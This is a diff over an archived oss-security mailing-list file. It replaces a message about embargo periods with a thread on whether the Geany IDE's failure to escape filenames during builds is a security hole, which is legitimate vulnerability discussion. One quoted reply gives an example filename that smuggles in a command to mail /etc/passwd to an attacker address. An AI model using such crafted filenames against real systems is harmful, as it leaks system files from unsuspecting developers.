@@ -1,32 +1,73 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/04/1
-Message-ID: <CANTw=MP2R6Qac+xW1GGME8AHx6Qhaw35mwXcTyBjbSKMBtNLSg@mail.gmail.com>
-Date: Fri, 3 Feb 2012 20:26:26 -0500
-From: Michael Gilbert <michael.s.gilbert@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: distros & linux-distros embargo period and message format
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/12/13/4
+Message-ID: <573621777.47121137.1355397692710.JavaMail.root@redhat.com>
+Date: Thu, 13 Dec 2012 06:21:32 -0500 (EST)
+From: Jan Lieskovsky <jlieskov@...hat.com>
+To: Andreas Ericsson <ae@....se>
+Cc: Eitan Adler <lists@...anadler.com>, "Steven M. Christey" <coley@...us.mitre.org>, Nick Treleaven <nick.treleaven@...nternet.com>, Colomban Wendling <lists.ban@...besfolles.org>, Enrico Troeger <enrico.troeger@...na.de>, Matthew Brush <mbrush@...ebrainz.ca>, Frank Lanitz <frank@...nk.uvena.de>, josef@...icpanda.com, jonathan underwood <jonathan.underwood@...il.com>, oss-security@...ts.openwall.com
+Subject: Re: Geany IDE not escaping filenames during compilation / build - a security issue or not?
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Feb 1, 2012 at 11:54 PM, Solar Designer wrote:
-> Yet I needed to bring the topic up.  I was not 100% sure that some
-> vendors currently on the list would find 7-11 days unacceptable.  Being
-> 90% sure was not enough.
->
-> I've noticed a decrease in embargo periods over time - I think for
-> vendor-sec the average might have been 14 days if not more, whereas now
-> it might be down to 10-12 days or so (excluding the hash DoS thing).
-> So we turned the old average into the new maximum.  I thought that maybe
-> we were ready for the "next level" - but it seems not.  Maybe later?
+Hi Andreas,
 
-I think the important aspect here is the transparency of the private
-discussion (after an appropriate delay), rather than the length of the
-delay itself.  That can be set by the researcher (with some reasonable
-maximum, like a month).
+  I think it's unlikely to happen for one file.
+But what for project with (hundred, thousand of) small files?
 
-We all should be able to see what is going on over in the closed list.
- Although it is unlikely being used for nefarious purposes (hiding
-issues permanently, etc.), transparency (after a delay) is the only
-way to show that it is not.  Anyway, 30 days seems appropriate.
+Is the user prior building expected to investigate file name of
+each of them for sanity? This is where trust boundary is crossed -
+someone could send you a tarball: "Here is the source you were
+searching for." You would go to build it in Geany..
 
-Best wishes,
-Mike
+The difference when running it directly from the command line is
+that Bash would escape those files for you, so even with crafted names
+nothing bad / suspicious would happen (and project would build
+if syntactically correct).
+
+To the difference, in the Geany scenario, the file name(s) would
+be passed to command line directly as they are (and if the project
+would build or not at the end isn't what matters here).
+
+Regards, Jan.
+--
+Jan iankko Lieskovsky / Red Hat Security Response Team
+
+P.S.: Above based on my short playing with Geany. While original exploit
+      mentions just one file case, looks the same is possible for projects
+      (having multiple Makefiles).
+
+----- Original Message -----
+On 12/13/2012 06:54 AM, Eitan Adler wrote:
+> On 12 December 2012 11:51, Jan Lieskovsky <jlieskov@...hat.com> wrote:
+>> The questions:
+>> 1) should Geany escape the filenames?,
+> 
+> Up to the maintainers.
+> 
+>> 2) is this a security issue or not?
+> 
+> Unlikely.  Is there a way a malicious document could cause code
+> execution without user action?
+> 
+
+Extremely unlikely. The way to get someone to trigger this is to send
+a source-file to a developer who then opens it in geany without realizing
+that the file is named "mail evil@...kdom.com -s teehee < /etc/passwd".
+The "attacked" developer then need to attempt to build it from geany's
+internal "build now" button.
+
+A simpler misdeed of similar charactaristics would be to ship a bogus
+./configure script that people (who are not developers, mind you)
+blindly run and which executes bogus commands on behalf of the logged
+in user.
+
+Since the latter isn't really CVE-worthy, I doubt the former even
+comes close.
+
+-- 
+Andreas Ericsson                   andreas.ericsson@....se
+OP5 AB                             www.op5.se
+Tel: +46 8-230225                  Fax: +46 8-230231
+
+Considering the successes of the wars on alcohol, poverty, drugs and
+terror, I think we should give some serious thought to declaring war
+on peace.
